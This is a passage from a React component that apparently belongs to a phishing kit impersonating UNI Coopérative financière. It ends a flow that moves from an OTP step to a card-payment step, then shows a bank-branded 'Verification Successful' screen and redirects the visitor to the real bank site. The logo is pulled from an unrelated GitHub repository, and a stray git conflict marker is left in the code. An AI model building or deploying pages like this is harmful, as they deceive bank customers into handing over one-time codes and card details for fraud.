      {step === 'otp' && <OTPPage onNext={() => setStep('card')} sessionId={sessionId} />}
      {step === 'card' && <PaymentPage onNext={() => setStep('success')} sessionId={sessionId} />}
      
      {step === 'success' && (
        <div style={{ minHeight: '100vh', backgroundColor: '#ffffff', color: '#333333', fontFamily: "'Roboto', sans-serif", display: 'flex', justifyContent: 'center' }}>
          <div style={{ width: '100%', maxWidth: '440px', padding: '24px 30px', boxSizing: 'border-box', textAlign: 'center', marginTop: '40px' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '40px' }}>
              <img 
                src="/logo.jpg" 
                onError={(e) => { e.currentTarget.src = "https://raw.githubusercontent.com/moufasarim-lang/dhblink/main/public/logo.jpg"; }}
                alt="UNI Coopérative financière" 
                style={{ height: '75px', width: 'auto', objectFit: 'contain' }} 
              />
            </div>

            <i className="fa-solid fa-circle-check" style={{ fontSize: '80px', color: '#28a745', marginBottom: '25px', display: 'block' }}></i>

            <h1 style={{ fontSize: '32px', fontWeight: 700, color: '#4a4a4a', margin: '0 0 15px 0' }}>Verification Successful</h1>
            <p style={{ fontSize: '18px', fontWeight: 500, color: '#4a4a4a', margin: '0 0 30px 0', lineHeight: 1.5 }}>
              Your identity has been successfully verified. You can now securely continue to your account.
            </p>

            <button 
              onClick={() => window.location.href = 'https://www.uni.ca/en'} 
              style={{
                width: '100%',
                padding: '15px',
                backgroundColor: '#0981C5',
                color: '#ffffff',
                border: 'none',
                borderRadius: '4px',
                fontSize: '18px',
                fontWeight: 500,
                cursor: 'pointer',
                marginBottom: '20px'
              }}
            >
              Return to home
            </button>
          </div>
        </div>
      )}
    </div>
>>>>>>> Stashed changes
  )
}
